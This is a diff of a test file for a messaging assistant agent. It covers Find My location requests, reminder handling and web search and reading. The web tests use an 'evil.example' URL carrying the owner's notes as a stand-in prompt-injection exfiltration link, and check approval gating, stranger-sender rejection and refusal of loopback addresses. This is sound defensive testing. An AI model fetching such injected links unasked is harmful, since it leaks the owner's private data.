@@ -1,8 +1,9 @@
 import assert from "node:assert/strict";
 import { afterEach, beforeEach, describe, it } from "node:test";
-import type { InboundAttachment } from "../src/channel.ts";
+import { askText } from "../src/approval.ts";
 import { ASK_TEXT } from "../src/location.ts";
 import { PLACES_HOST, PLACES_URL } from "../src/places.ts";
+import { SEARCH_URL } from "../src/web.ts";
 import { REMINDER_PREFIX } from "../src/reminders.ts";
 import { STOPPED_TEXT } from "../src/app.ts";
 import { call, flatten, inbound, say } from "./helpers.ts";
@@ -10,29 +11,7 @@ import { Rig } from "./rig.ts";
 
 const opts = { timeout: 30000 };
 
-const LOC_VCF = [
-  "BEGIN:VCARD",
-  "VERSION:3.0",
-  "N:;Current Location;;;",
-  "FN:Current Location",
-  "item1.URL;type=pref:http://maps.apple.com/?ll=12.96890\\,77.58420&q=12.96890\\,77.58420&t=m",
-  "item1.X-ABLabel:map url",
-  "END:VCARD",
-  "",
-].join("\r\n");
-
-const attachment = (fileName: string, mimeType: string, body: string, onRead?: () => void): InboundAttachment => ({
-  fileName,
-  mimeType,
-  size: body.length,
-  read: async () => {
-    onRead?.();
-    return Buffer.from(body, "utf8");
-  },
-});
-
-const pin = (id: string, body = LOC_VCF, onRead?: () => void) =>
-  inbound(id, undefined, { attachments: [attachment("Current Location.loc.vcf", "text/vcard", body, onRead)] });
+const here = { current: async () => ({ latitude: 12.9689, longitude: 77.5842, label: "Current Location", at: Date.now() }), request: async () => true };
 
 type Seen = { url: string; init: { headers: Record<string, string>; redirect: string } };
 
@@ -114,7 +93,7 @@ describe("reminders", () => {
     assert.match(last, /UTC offset/);
   });
 
-  it("holds a due reminder while stopped and sends it after RESUME", opts, async () => {
+  it("drops a reminder that comes due while stopped, and logs it", opts, async () => {
     rig.model.enqueue(call("reminder_set", { text: "later", inMinutes: 0.03 }), say("Set."));
     await rig.boot();
     rig.channel.push(inbound("m1", "remind me"));
@@ -123,10 +102,11 @@ describe("reminders", () => {
     await rig.channel.sentCount(2);
     assert.equal(rig.texts()[1], STOPPED_TEXT);
     await new Promise((resolve) => setTimeout(resolve, 2600));
+    await rig.logged("reminder_dropped");
     assert.deepEqual(rig.texts(), ["Set.", STOPPED_TEXT]);
     rig.channel.push(inbound("m3", "RESUME"));
-    await rig.channel.sentCount(4);
-    assert.deepEqual(rig.texts().slice(2).sort(), ["Resumed.", `${REMINDER_PREFIX}later`].sort());
+    await rig.channel.sentCount(3);
+    assert.deepEqual(rig.texts(), ["Set.", STOPPED_TEXT, "Resumed."]);
   });
 
   it("answers time_now with the owner's zone", opts, async () => {
@@ -154,55 +134,69 @@ describe("location and nearby places", () => {
     assert.deepEqual(rig.texts().sort(), [ASK_TEXT, "I asked you to share it."].sort());
   });
 
-  it("saves a location from the allowed sender, tells the model, and reads it back", opts, async () => {
-    rig.model.enqueue(say("Got your location."), call("location_last", {}), say("Last seen."));
+  it("asks with a Find My request card when it can, and falls back to a text when it cannot", opts, async () => {
+    const requested: string[] = [];
+    rig.model.enqueue(call("location_request", {}), say("I sent a request."), call("location_request", {}), say("I asked by text."));
+    rig.channel.locations = {
+      current: async () => undefined,
+      request: async (space) => {
+        requested.push(space);
+        return requested.length === 1;
+      },
+    };
     await rig.boot();
-    rig.channel.push(pin("m1"));
+    rig.channel.push(inbound("m1", "where am I"));
     await rig.channel.sentCount(1);
-    assert.match(flatten(rig.model.requests[0] as never), /I shared my location: 12\.96890, 77\.58420 \(Current Location\)/);
-    rig.channel.push(inbound("m2", "where was I"));
-    await rig.channel.sentCount(2);
-    assert.match(flatten(rig.model.requests.at(-1) as never), /12\.96890, 77\.58420 \(Current Location\), shared \d+ min ago|shared just now/);
+    assert.deepEqual(rig.texts(), ["I sent a request."]);
+    assert.deepEqual(requested, ["space-1"]);
+    rig.channel.push(inbound("m2", "again"));
+    await rig.channel.sentCount(3);
+    assert.deepEqual(rig.texts().slice(1).sort(), [ASK_TEXT, "I asked by text."].sort());
   });
 
-  it("ignores a location from a stranger and never reads the file", opts, async () => {
-    let reads = 0;
-    await rig.boot();
-    rig.channel.push({ ...pin("m1", LOC_VCF, () => (reads += 1)), sender: "stranger@example.test" });
-    rig.model.enqueue(say("hello"));
-    rig.channel.push(inbound("m2", "hi"));
+  it("uses the Find My location for nearby places and says where it came from", opts, async () => {
+    const seen: Seen[] = [];
+    rig.channel.locations = { current: async () => ({ latitude: 12.9689, longitude: 77.5842, label: "Indiranagar", at: Date.now() - 60_000 }), request: async () => true };
+    rig.model.enqueue(call("places_nearby", { query: "coffee" }), say("Here."));
+    await rig.boot({ fetch: photon([feature("Near Coffee", 12.9692, 77.5843)], seen) });
+    rig.channel.push(inbound("m1", "coffee near me"));
     await rig.channel.sentCount(1);
-    assert.equal(reads, 0);
-    assert.equal(rig.model.requests.length, 1);
-    assert.doesNotMatch(flatten(rig.model.requests[0] as never), /12\.96890/);
+    const result = flatten(rig.model.requests.at(-1) as never);
+    assert.match(result, /Find My location from 1 min ago/);
+    assert.match(result, /Near Coffee/);
+    assert.equal(new URL(seen[0]?.url ?? "").searchParams.get("lat"), "12.9689");
   });
 
-  it("ignores other attachments and logs a vcard it cannot place", opts, async () => {
-    let reads = 0;
+  it("reads the Find My location with its age", opts, async () => {
+    rig.channel.locations = here;
+    rig.model.enqueue(call("location_last", {}), say("Seen."));
     await rig.boot();
-    rig.channel.push(inbound("m1", undefined, { attachments: [attachment("photo.jpg", "image/jpeg", "xx", () => (reads += 1))] }));
-    rig.channel.push(pin("m2", "BEGIN:VCARD\r\nFN:Some Person\r\nTEL:000\r\nEND:VCARD\r\n"));
-    await rig.logged("attachment_unparsed");
-    assert.equal(reads, 0);
-    assert.equal(rig.model.requests.length, 0);
-    assert.deepEqual(rig.texts(), []);
-    const entry = rig.logs.find((log) => log.event === "attachment_unparsed");
-    assert.deepEqual(Object.keys(entry?.fields ?? {}).sort(), ["fileName", "id", "mimeType", "size"]);
+    rig.channel.push(inbound("m1", "where am I"));
+    await rig.channel.sentCount(1);
+    assert.match(flatten(rig.model.requests.at(-1) as never), /12\.96890, 77\.58420 \(Current Location\), (just now|\d+ min ago)/);
+  });
+
+  it("says so when nobody is sharing a location", opts, async () => {
+    rig.channel.locations = { current: async () => undefined, request: async () => true };
+    rig.model.enqueue(call("location_last", {}), say("Nothing."));
+    await rig.boot();
+    rig.channel.push(inbound("m1", "where am I"));
+    await rig.channel.sentCount(1);
+    assert.match(flatten(rig.model.requests.at(-1) as never), /No location yet/);
   });
 
   it("answers 'coffee near me' with real-looking places sorted by distance, through the one lookup host", opts, async () => {
     const seen: Seen[] = [];
-    rig.model.enqueue(say("Got it."), call("places_nearby", { query: "coffee" }), say("Here are some."));
+    rig.channel.locations = here;
+    rig.model.enqueue(call("places_nearby", { query: "coffee" }), say("Here are some."));
     await rig.boot({
       fetch: photon(
         [feature("Far Coffee", 12.975, 77.5842), feature("Near Coffee", 12.9692, 77.5843), feature("Too Far Coffee", 13.5, 77.9), feature("Near Coffee", 12.9692, 77.5843)],
         seen,
       ),
     });
-    rig.channel.push(pin("m1"));
+    rig.channel.push(inbound("m1", "coffee near me"));
     await rig.channel.sentCount(1);
-    rig.channel.push(inbound("m2", "coffee near me"));
-    await rig.channel.sentCount(2);
     const toolResult = flatten(rig.model.requests.at(-1) as never);
     assert.match(toolResult, /2 result\(s\) for \\"coffee\\"/);
     assert.ok(toolResult.indexOf("Near Coffee") < toolResult.indexOf("Far Coffee"));
@@ -223,7 +217,7 @@ describe("location and nearby places", () => {
     await rig.boot({ fetch: photon([], seen) });
     rig.channel.push(inbound("m1", "coffee near me"));
     await rig.channel.sentCount(1);
-    assert.match(flatten(rig.model.requests[1] as never), /No saved location/);
+    assert.match(flatten(rig.model.requests[1] as never), /No known location/);
     assert.equal(seen.length, 0);
   });
 
@@ -251,28 +245,161 @@ describe("location and nearby places", () => {
     assert.match(flatten(rig.model.requests[1] as never), /Could not find a place called Nowhereville/);
   });
 
-  it("survives a malformed vcard from the owner and keeps answering", opts, async () => {
-    rig.model.enqueue(say("still here"));
-    await rig.boot();
-    rig.channel.push(pin("m1", "BEGIN:VCARD\r\nURL:http://maps.apple.com/%\r\nEND:VCARD\r\n"));
-    await rig.logged("attachment_unparsed");
-    rig.channel.push(inbound("m2", "hello"));
-    await rig.channel.sentCount(1);
-    assert.deepEqual(rig.texts(), ["still here"]);
-  });
-
   it("reports a failed lookup to the model without crashing", opts, async () => {
-    rig.model.enqueue(say("Saved."), call("places_nearby", { query: "coffee" }), say("Lookup failed, sorry."));
+    rig.channel.locations = here;
+    rig.model.enqueue(call("places_nearby", { query: "coffee" }), say("Lookup failed, sorry."));
     await rig.boot({
       fetch: async () => {
         throw new Error("network down");
       },
     });
-    rig.channel.push(pin("m1"));
+    rig.channel.push(inbound("m1", "coffee near me"));
     await rig.channel.sentCount(1);
-    rig.channel.push(inbound("m2", "coffee near me"));
-    await rig.channel.sentCount(2);
     assert.match(flatten(rig.model.requests.at(-1) as never), /places lookup failed/i);
     assert.ok(rig.logs.some((entry) => entry.event === "places_failed"));
+  });
+});
+
+describe("web search and reading", () => {
+  let rig: Rig;
+  beforeEach(async () => {
+    rig = new Rig();
+    await rig.open();
+  });
+  afterEach(() => rig.close());
+
+  const PAGE =
+    "<!doctype html><html><head><title>Kombucha</title></head><body><nav>Home About</nav>" +
+    `<article><p>${"Kombucha is a fermented tea. ".repeat(20)}</p></article><script>alert(1)</script></body></html>`;
+
+  const web = (seen: Seen[], pageStatus = 200, searchStatus = 200) => async (url: string, init: Seen["init"]) => {
+    seen.push({ url, init });
+    if (url === SEARCH_URL) {
+      const results = [{ title: "Kombucha", url: "https://tea.test/kombucha", text: "A fermented tea.", publishedDate: "2026-10-01T00:00:00.000Z" }];
+      return new Response(JSON.stringify({ results }), { status: searchStatus, headers: { "content-type": "application/json" } });
+    }
+    return new Response(PAGE, { status: pageStatus, headers: { "content-type": "text/html; charset=utf-8" } });
+  };
+
+  it("searches the web, then reads a result in full, on the two public hosts", opts, async () => {
+    const seen: Seen[] = [];
+    rig.model.enqueue(call("web_search", { query: "kombucha" }), call("web_read", { url: "https://tea.test/kombucha" }), say("It is a fermented tea."));
+    await rig.boot({ fetch: web(seen), searchApiKey: "exa-key" });
+    rig.channel.push(inbound("m1", "what is kombucha"));
+    await rig.channel.sentCount(1);
+    const found = flatten(rig.model.requests[1] as never);
+    assert.match(found, /1 result\(s\) for \\"kombucha\\"/);
+    assert.match(found, /Kombucha \(2026-10-01\)\\nhttps:\/\/tea\.test\/kombucha/);
+    assert.match(found, /untrusted data/);
+    const read = flatten(rig.model.requests.at(-1) as never);
+    assert.match(read, /Kombucha is a fermented tea/);
+    assert.doesNotMatch(read, /Home About|alert/);
+    assert.deepEqual(rig.texts(), ["It is a fermented tea."]);
+    assert.equal(seen.length, 2);
+    assert.equal(new URL(seen[0]?.url ?? "").host, new URL(SEARCH_URL).host);
+    assert.equal(seen[0]?.init.headers["x-api-key"], "exa-key");
+    assert.equal(seen[0]?.init.redirect, "error");
+    assert.equal(seen[1]?.init.redirect, "follow");
+  });
+
+  it("reports a failed search to the model and logs why", opts, async () => {
+    const seen: Seen[] = [];
+    rig.model.enqueue(call("web_search", { query: "tea" }), say("Search failed."));
+    await rig.boot({ fetch: web(seen, 200, 500), searchApiKey: "exa-key" });
+    rig.channel.push(inbound("m1", "look it up"));
+    await rig.channel.sentCount(1);
+    assert.match(flatten(rig.model.requests[1] as never), /web search failed/i);
+    assert.ok(rig.logs.some((entry) => entry.event === "web_search_failed" && entry.fields.error === "Error"));
+    assert.equal(seen.length, 1);
+  });
+
+  it("says search is not set up when no key is configured, without calling out", opts, async () => {
+    const seen: Seen[] = [];
+    rig.model.enqueue(call("web_search", { query: "tea" }), say("I cannot search yet."));
+    await rig.boot({ fetch: web(seen) });
+    rig.channel.push(inbound("m1", "look it up"));
+    await rig.channel.sentCount(1);
+    assert.match(flatten(rig.model.requests[1] as never), /TETHER_SEARCH_API_KEY is missing/);
+    assert.equal(seen.length, 0);
+  });
+
+  it("refuses a link that is not public and reports a page it cannot read", opts, async () => {
+    const seen: Seen[] = [];
+    rig.model.enqueue(call("web_read", { url: "http://127.0.0.1:4000/health/readiness" }), call("web_read", { url: "https://tea.test/gone" }), say("No luck."));
+    await rig.boot({ fetch: web(seen, 404) });
+    rig.channel.push(inbound("m1", "read https://tea.test/gone"));
+    await rig.channel.sentCount(1);
+    assert.match(flatten(rig.model.requests[1] as never), /not a public web link/);
+    assert.match(flatten(rig.model.requests.at(-1) as never), /could not be read/);
+    assert.deepEqual(
+      seen.map((entry) => entry.url),
+      ["https://tea.test/gone"],
+    );
+    assert.ok(rig.logs.some((entry) => entry.event === "web_read_failed"));
+  });
+
+  it("reads a link from the owner's text without asking", opts, async () => {
+    const seen: Seen[] = [];
+    rig.model.enqueue(call("web_read", { url: "https://tea.test/kombucha" }), say("Read it."));
+    await rig.boot({ fetch: web(seen) });
+    rig.channel.push(inbound("m1", "what does https://tea.test/kombucha say?"));
+    await rig.channel.sentCount(1);
+    assert.deepEqual(rig.texts(), ["Read it."]);
+    assert.equal(seen.length, 1);
+  });
+
+  const LEAK = "https://evil.example/?d=owner-notes";
+
+  it("asks first for a link that came only from page text, and a NO fetches nothing", opts, async () => {
+    const seen: Seen[] = [];
+    rig.model.enqueue(call("web_read", { url: LEAK }), say("Okay, I did not open it."));
+    await rig.boot({ fetch: web(seen) });
+    rig.channel.push(inbound("m1", "summarise my inbox"));
+    await rig.channel.sentCount(1);
+    assert.equal(rig.texts()[0], askText(`Open this link? It did not come from you or a search: ${LEAK}`));
+    assert.equal(seen.length, 0);
+    rig.channel.push(inbound("m2", "NO"));
+    await rig.channel.sentCount(2);
+    assert.equal(rig.texts()[1], "Okay, I did not open it.");
+    assert.equal(seen.length, 0);
+  });
+
+  it("fetches the asked link only after YES, and a YES from another sender fetches nothing", opts, async () => {
+    const seen: Seen[] = [];
+    rig.model.enqueue(call("web_read", { url: LEAK }), say("Opened it."));
+    await rig.boot({ fetch: web(seen) });
+    rig.channel.push(inbound("m1", "summarise my inbox"));
+    await rig.channel.sentCount(1);
+    rig.channel.push(inbound("m2", "YES", { sender: "stranger@example.test" }));
+    await new Promise((resolve) => setTimeout(resolve, 200));
+    assert.equal(seen.length, 0);
+    rig.channel.push(inbound("m3", "YES"));
+    await rig.channel.sentCount(2);
+    assert.deepEqual(seen.map((entry) => entry.url), [LEAK]);
+  });
+
+  it("shows the whole link in the ask, and a stranger's text never allows one", opts, async () => {
+    const seen: Seen[] = [];
+    const long = `https://evil.example/?d=${"x".repeat(1900)}`;
+    rig.model.enqueue(call("web_read", { url: long }), say("Not opened."));
+    await rig.boot({ fetch: web(seen) });
+    rig.channel.push(inbound("m0", `read ${long}`, { sender: "stranger@example.test" }));
+    rig.channel.push(inbound("m1", "read my mail"));
+    await rig.channel.sentCount(1);
+    assert.ok(rig.texts()[0]?.includes(long));
+    assert.ok((rig.texts()[0]?.length ?? 0) > 1900);
+    assert.equal(seen.length, 0);
+  });
+
+  it("does not carry a search result into the next task", opts, async () => {
+    const seen: Seen[] = [];
+    rig.model.enqueue(call("web_search", { query: "kombucha" }), say("Found it."), call("web_read", { url: "https://tea.test/kombucha" }), say("Not opened."));
+    await rig.boot({ fetch: web(seen), searchApiKey: "exa-key" });
+    rig.channel.push(inbound("m1", "search kombucha"));
+    await rig.channel.sentCount(1);
+    rig.channel.push(inbound("m2", "now read the first one"));
+    await rig.channel.sentCount(2);
+    assert.match(rig.texts()[1] ?? "", /Allow this\? Open this link\? .*https:\/\/tea\.test\/kombucha/);
+    assert.equal(seen.length, 1);
   });
 });
